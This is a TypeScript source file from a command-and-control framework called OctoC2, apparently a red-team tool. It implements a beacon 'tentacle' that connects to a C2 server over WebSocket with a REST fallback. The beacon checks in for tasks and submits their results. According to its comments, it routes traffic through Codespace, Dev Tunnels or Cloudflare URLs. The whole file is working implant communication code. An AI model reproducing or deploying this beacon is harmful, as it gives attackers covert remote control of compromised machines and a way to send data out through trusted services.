/**
 * OctoC2 — HttpTentacle  (Tentacle 13 — HTTP/WebSocket direct channel)
 *
 * Connects to the C2 server's HTTP endpoint on port 8080 (Codespace public URL
 * or any HTTPS URL). Works through Dev Tunnels and Cloudflare tunnels because
 * it uses HTTP/1.1 (WebSocket upgrade), unlike gRPC which requires H2C.
 *
 * Environment variables (read via dot notation — Bun --define substitution):
 *   SVC_HTTP_URL  — base URL, e.g. "https://codespace-8080.app.github.dev"
 *                   Set at build time via octoctl build-beacon --http-url.
 *
 * Primary:  WebSocket  wss://<host>/ws   (JSON message protocol)
 * Fallback: REST        POST /api/beacon/checkin
 *                       POST /api/beacon/submit-result
 *
 * Auth: Authorization: Bearer <config.token> on all HTTP requests;
 *       WebSocket: query param ?token=<config.token>
 */

import type {
  BeaconConfig,
  CheckinPayload,
  Task,
  TaskResult,
  ITentacle,
  TentacleKind,
} from "../types.ts";
import { createLogger } from "../logger.ts";

const log = createLogger("HttpTentacle");

const WS_TIMEOUT_MS   = 30_000;
const HTTP_TIMEOUT_MS = 10_000;

export class HttpTentacle implements ITentacle {
  readonly kind: TentacleKind = "http";

  private readonly config: BeaconConfig;
  private baseUrl: string | null = null;
  private activeWs: WebSocket | null = null;

  constructor(config: BeaconConfig) {
    this.config = config;
  }

  // ── isAvailable ────────────────────────────────────────────────────────────

  async isAvailable(): Promise<boolean> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const url = process.env.SVC_HTTP_URL?.trim();
    if (!url) {
      log.debug("isAvailable() → false (SVC_HTTP_URL not set)");
      return false;
    }

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
      const resp = await fetch(`${url}/api/health`, {
        method: "GET",
        headers: { Authorization: `Bearer ${this.config.token}` },
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (resp.ok) {
        this.baseUrl = url;
        log.debug(`isAvailable() → true (${url})`);
        return true;
      }
      log.debug(`isAvailable() → false (health check status ${resp.status})`);
      return false;
    } catch (err) {
      log.debug(`isAvailable() → false: ${(err as Error).message}`);
      return false;
    }
  }

  // ── checkin ────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    const url = this.baseUrl ?? process.env.SVC_HTTP_URL?.trim() ?? "";

    // ── WebSocket path ──────────────────────────────────────────────────────
    try {
      const tasks = await this.wsCheckin(url, payload);
      log.info(`checkin (WS) → ${tasks.length} task(s)`);
      return tasks;
    } catch (err) {
      log.warn(`checkin WS failed (${(err as Error).message}), falling back to REST`);
    }

    // ── REST fallback ───────────────────────────────────────────────────────
    const resp = await fetch(`${url}/api/beacon/checkin`, {
      method:  "POST",
      headers: {
        "Content-Type":  "application/json",
        "Authorization": `Bearer ${this.config.token}`,
      },
      body: JSON.stringify(payload),
    });

    if (!resp.ok) {
      throw new Error(`checkin REST failed: HTTP ${resp.status}`);
    }

    const data = await resp.json() as { tasks?: Task[] };
    const tasks: Task[] = data.tasks ?? [];
    log.info(`checkin (REST) → ${tasks.length} task(s)`);
    return tasks;
  }

  // ── submitResult ───────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    const url = this.baseUrl ?? process.env.SVC_HTTP_URL?.trim() ?? "";

    // ── WebSocket path ──────────────────────────────────────────────────────
    try {
      await this.wsSubmitResult(url, result);
      log.info(`submitResult (WS) task ${result.taskId}`);
      return;
    } catch (err) {
      log.warn(`submitResult WS failed (${(err as Error).message}), falling back to REST`);
    }

    // ── REST fallback ───────────────────────────────────────────────────────
    const resp = await fetch(`${url}/api/beacon/submit-result`, {
      method:  "POST",
      headers: {
        "Content-Type":  "application/json",
        "Authorization": `Bearer ${this.config.token}`,
      },
      body: JSON.stringify(result),
    });

    if (resp.status !== 200 && resp.status !== 201) {
      throw new Error(`submitResult REST failed: HTTP ${resp.status}`);
    }

    log.info(`submitResult (REST) task ${result.taskId}`);
  }

  // ── teardown ───────────────────────────────────────────────────────────────

  async teardown(): Promise<void> {
    if (this.activeWs) {
      try { this.activeWs.close(); } catch {}
      this.activeWs = null;
    }
    log.debug("teardown() complete");
  }

  // ── private WebSocket helpers ──────────────────────────────────────────────

  private buildWsUrl(baseUrl: string): string {
    return (
      baseUrl
        .replace(/^https:\/\//, "wss://")
        .replace(/^http:\/\//, "ws://")
      + `/ws?token=${encodeURIComponent(this.config.token)}`
    );
  }

  private wsCheckin(baseUrl: string, payload: CheckinPayload): Promise<Task[]> {
    return new Promise<Task[]>((resolve, reject) => {
      const wsUrl = this.buildWsUrl(baseUrl);
      let ws: WebSocket;
      try {
        ws = new WebSocket(wsUrl);
      } catch (err) {
        return reject(err);
      }

      this.activeWs = ws;

      const timer = setTimeout(() => {
        try { ws.close(); } catch {}
        this.activeWs = null;
        reject(new Error("WS checkin timeout"));
      }, WS_TIMEOUT_MS);

      ws.onopen = () => {
        ws.send(JSON.stringify({ type: "checkin", payload }));
      };

      ws.onmessage = (event) => {
        clearTimeout(timer);
        try {
          const msg = JSON.parse(event.data as string) as { type: string; tasks?: Task[] };
          if (msg.type === "checkin-response") {
            try { ws.close(); } catch {}
            this.activeWs = null;
            resolve(msg.tasks ?? []);
          } else {
            // Unexpected message type — wait for the right one (timer still running)
          }
        } catch (err) {
          clearTimeout(timer);
          try { ws.close(); } catch {}
          this.activeWs = null;
          reject(new Error(`WS checkin parse error: ${(err as Error).message}`));
        }
      };

      ws.onerror = () => {
        clearTimeout(timer);
        this.activeWs = null;
        reject(new Error("WS checkin connection error"));
      };

      ws.onclose = (event) => {
        clearTimeout(timer);
        this.activeWs = null;
        if (!event.wasClean) {
          reject(new Error(`WS checkin closed unexpectedly (code ${event.code})`));
        }
      };
    });
  }

  private wsSubmitResult(baseUrl: string, result: TaskResult): Promise<void> {
    return new Promise<void>((resolve, reject) => {
      const wsUrl = this.buildWsUrl(baseUrl);
      let ws: WebSocket;
      try {
        ws = new WebSocket(wsUrl);
      } catch (err) {
        return reject(err);
      }

      this.activeWs = ws;

      const timer = setTimeout(() => {
        try { ws.close(); } catch {}
        this.activeWs = null;
        reject(new Error("WS submitResult timeout"));
      }, WS_TIMEOUT_MS);

      ws.onopen = () => {
        ws.send(JSON.stringify({ type: "submit-result", result }));
      };

      ws.onmessage = (event) => {
        clearTimeout(timer);
        try {
          const msg = JSON.parse(event.data as string) as { type: string };
          if (msg.type === "result-accepted") {
            try { ws.close(); } catch {}
            this.activeWs = null;
            resolve();
          } else {
            // Unexpected message type — wait for the right one (timer still running)
          }
        } catch (err) {
          clearTimeout(timer);
          try { ws.close(); } catch {}
          this.activeWs = null;
          reject(new Error(`WS submitResult parse error: ${(err as Error).message}`));
        }
      };

      ws.onerror = () => {
        clearTimeout(timer);
        this.activeWs = null;
        reject(new Error("WS submitResult connection error"));
      };

      ws.onclose = (event) => {
        clearTimeout(timer);
        this.activeWs = null;
        if (!event.wasClean) {
          reject(new Error(`WS submitResult closed unexpectedly (code ${event.code})`));
        }
      };
    });
  }
}
